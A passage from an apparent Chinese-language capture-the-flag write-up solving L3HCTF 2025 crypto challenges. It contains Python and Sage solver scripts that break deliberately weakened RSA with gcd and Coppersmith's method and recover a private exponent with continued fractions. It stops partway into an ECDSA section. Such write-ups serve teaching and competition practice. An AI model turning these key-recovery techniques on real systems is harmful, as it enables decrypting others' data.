</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=n>randint</span>  
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=n>invert</span>  
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scret</span> <span class=kn>import</span> <span class=n>flag</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>myfunction</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=mi>0</span>  
</span></span><span class=line><span class=cl>    <span class=n>output</span><span class=o>=</span><span class=n>num</span><span class=o>**</span><span class=mi>3</span>  
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>output</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>    <span class=n>flag_len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>,</span> <span class=n>q</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>512</span><span class=p>),</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>512</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>512</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>R</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>r</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>  
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>isPrime</span><span class=p>(</span><span class=n>R</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>            <span class=k>break</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=n>p</span> <span class=o>*</span> <span class=n>q</span> <span class=o>*</span> <span class=n>r</span>  
</span></span><span class=line><span class=cl>    <span class=n>hint1</span> <span class=o>=</span> <span class=n>R</span> <span class=o>*</span> <span class=n>r</span>  
</span></span><span class=line><span class=cl>    <span class=n>mod</span> <span class=o>=</span> <span class=n>myfunction</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>hint2</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=mi>3</span><span class=o>*</span><span class=n>n</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=n>p</span> <span class=o>%</span> <span class=p>(</span><span class=mi>2</span> <span class=o>**</span> <span class=mi>400</span><span class=p>),</span> <span class=n>mod</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>m</span><span class=p>,</span> <span class=mi>65537</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;All data:&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;n = </span><span class=si>{</span><span class=n>n</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;c = </span><span class=si>{</span><span class=n>c</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;hint1 = </span><span class=si>{</span><span class=n>hint1</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;hint2 = </span><span class=si>{</span><span class=n>hint2</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>  
</span></span></code></pre></td></tr></table></div></div><p>给出的数据有 $n=pqr$，$hint_1=R \cdot r$，$hint_2 \equiv (3n+1)^{p\bmod{2^{400&#125;&#125;} \pmod{n^3}$，显然有 $gcd(n,hint_1)=r$，猜测flag不大的情况下直接在模 $n$ 下就能解出flag：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=n>gcd</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=mi>102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984</span>
</span></span><span class=line><span class=cl><span class=n>hint1</span> <span class=o>=</span> <span class=mi>41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333</span>
</span></span><span class=line><span class=cl><span class=n>hint2</span> <span class=o>=</span> <span class=mi>10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>gcd</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>hint1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=mi>65537</span><span class=p>,</span> <span class=n>r</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>m</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>对于 $\text{hint}_1$，设 $p_l \equiv p \pmod{2^{400&#125;&#125;$，那么通过二项式定理展开整理可以得到：</p><p>$\text{hint}_2 \equiv 1 + p_l \cdot 3n + \frac{p_l(p_l-1)}{2}(3n)^2 \pmod{n^3}$</p><p>模 $n^2$ 可以更进一步得到：</p><p>$\text{hint}_2 \equiv 1 + p_l \cdot 3n \pmod{n^2}$</p><p>显然的，$p_l \cdot 3n + 1 = \text{hint}_2 \bmod n^2$，也就是说我们可以通过下式直接得到 $p$ 的低400位 $p_l$：</p><p>$p_l = \frac{\text{hint}_2 \bmod n^2 - 1}{3n}$</p><p>通过 Coppersmith 就可以还原出完整的 $p$ 了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># sage</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=mi>102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984</span>
</span></span><span class=line><span class=cl><span class=n>hint1</span> <span class=o>=</span> <span class=mi>41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333</span>
</span></span><span class=line><span class=cl><span class=n>hint2</span> <span class=o>=</span> <span class=mi>10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>GCD</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>hint1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pl</span> <span class=o>=</span> <span class=p>(</span><span class=n>hint2</span> <span class=o>%</span> <span class=p>(</span><span class=n>n</span><span class=o>^</span><span class=mi>2</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>//</span> <span class=p>(</span><span class=mi>3</span> <span class=o>*</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.&lt;</span><span class=n>x</span><span class=o>&gt;</span> <span class=o>=</span> <span class=n>Zmod</span><span class=p>(</span><span class=n>n</span><span class=o>//</span><span class=n>r</span><span class=p>)[]</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=n>x</span> <span class=o>*</span> <span class=mi>2</span><span class=o>^</span><span class=mi>400</span> <span class=o>+</span> <span class=n>pl</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>monic</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ph</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>small_roots</span><span class=p>(</span><span class=n>X</span><span class=o>=</span><span class=mi>2</span><span class=o>^</span><span class=mi>112</span><span class=p>,</span> <span class=n>beta</span><span class=o>=</span><span class=mf>0.4</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>ZZ</span><span class=p>(</span><span class=n>ph</span> <span class=o>*</span> <span class=mi>2</span><span class=o>^</span><span class=mi>400</span> <span class=o>+</span> <span class=n>pl</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=n>n</span> <span class=o>//</span> <span class=p>(</span><span class=n>p</span> <span class=o>*</span> <span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>phi</span> <span class=o>=</span> <span class=p>(</span><span class=n>p</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>r</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=mi>65537</span><span class=p>,</span> <span class=n>phi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>m</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=rrrsssaaa>RRRSSSAAA</h2><p>为了解密给定的密文，我们需要从公钥中恢复私钥。公钥包括模数 N 和指数 e，其中 e是通过一个自定义过程生成的。分析发现，私钥指数 $d$ 可以表示为 $d=\phi-d_{small}$，其中 $\phi=(p^4-1)(q^4-1)$，且 $d_{small}$ 是一个 1021 位的小整数。通过连分数方法，可以从 e 和 $N^4$ 的比值中恢复 $d_{small}$。然后，解密过程简化为计算 $c^{-d_{small&#125;&#125; \bmod N$。</p><p>所以首先计算 $N^4$，然后对有理数 $e/N^4$ 进行连分数展开，并遍历其渐近分数。对于每个渐近分数，检查分母的位长度是否为 1021 位（即 $2^{1020} \leq 分母 &lt; 2^{1021}$），随后对每个候选 $d_{small}$，尝试解密。</p><p>计算 $c$ 在模 $N$ 下的逆元，将 $m$ 转换为字节序列，检查是否包含 &ldquo;L3H"的内容。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sage.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>N</span> <span class=o>=</span> <span class=mi>99697845285265879829811232968100099666254250525000506525475952592468738395250956460890611762459685140661035795964867321445992110528627232335703962897072608767840783176553829502743629914407970206513639916759403399986924602596286330464348286080258986075962271511105387188070309852907253486162504945490429185609</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>74900336437853271512557457581304251523854378376434438153117909482138661618901386551154807447783262736408028580620771857416463085746907317126876189023636958838207330193074215769008709076254356539808209005917645822989554532710565445155350102802675594603406077862472881027575871589046600011223990947361848608637247276816477996863812313225929441545045479384803449990623969591150979899801722841101938868710054151839628803383603849632857020369527380816687165487370957857737696187061619496102857237814447790678611448197153594917852504509869007597997670022501500067854210261136878917620198551551460145853528269270832725348151160651020188255399136483482428499340574623409209151124687319668989144444549871527949104436734300277004316939985015286758651969045396343970037328043635061226100170529991733947365830164811844853806681198818875837903563263114249814483901121700854712406832325690101810786429930813776784979083590353027191492894890551838308899148551566437532914838098811643805243593419063566975400775134981190248113477610235165151367913498299241375039256652674679958159505112725441797566678743542054295794919839551675786573113798857814005058856054462008797386322048089657472710775620574463924678367455233801970310210504653908307254926827</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=mi>98460941530646528059934657633016619266170844887697553075379408285596784682803952762901219607460711533547279478564732097775812539176991062440097573591978613933775149262760936643842229597070673855940231912579258721734434631479496590694499265794576610924303262676255858387586947276246725949970866534023718638879</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>N4</span> <span class=o>=</span> <span class=n>N</span><span class=o>**</span><span class=mi>4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>alpha</span> <span class=o>=</span> <span class=n>e</span> <span class=o>/</span> <span class=n>N4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cf</span> <span class=o>=</span> <span class=n>continued_fraction</span><span class=p>(</span><span class=n>alpha</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>convergents</span> <span class=o>=</span> <span class=n>cf</span><span class=o>.</span><span class=n>convergents</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>conv</span> <span class=ow>in</span> <span class=n>convergents</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>k_candidate</span> <span class=o>=</span> <span class=n>conv</span><span class=o>.</span><span class=n>numerator</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>d_small_candidate</span> <span class=o>=</span> <span class=n>conv</span><span class=o>.</span><span class=n>denominator</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>d_small_candidate</span> <span class=o>&gt;=</span> <span class=mi>2</span><span class=o>**</span><span class=mi>1020</span> <span class=ow>and</span> <span class=n>d_small_candidate</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=o>**</span><span class=mi>1021</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># Decrypt</span>
</span></span><span class=line><span class=cl>            <span class=n>c_inv</span> <span class=o>=</span> <span class=n>inverse_mod</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=n>N</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>m</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>c_inv</span><span class=p>,</span> <span class=n>d_small_candidate</span><span class=p>,</span> <span class=n>N</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=n>m_bytes</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>m</span><span class=p>)</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>((</span><span class=n>m</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span> <span class=o>+</span> <span class=mi>7</span><span class=p>)</span> <span class=o>//</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;big&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;L3H&#39;</span> <span class=ow>in</span> <span class=n>m_bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Flag found:&#34;</span><span class=p>,</span> <span class=n>m_bytes</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Flag not found. Try more convergents or check the approach.&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://su-team.cn/img/2025-L3HCTF/9b171591-f889-413c-9bf8-ce93a93bc9b6.png alt=img></p><h2 id=ezecdsa>EzECDSA</h2><p>简单的密码题，把附件丢给gemini然后给出解题脚本即可，一次可能不行，让他修改优化即可</p><p><img src=https://su-team.cn/img/2025-L3HCTF/fb9ce8e3-89fe-43ee-9c6c-9fec648d4276.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
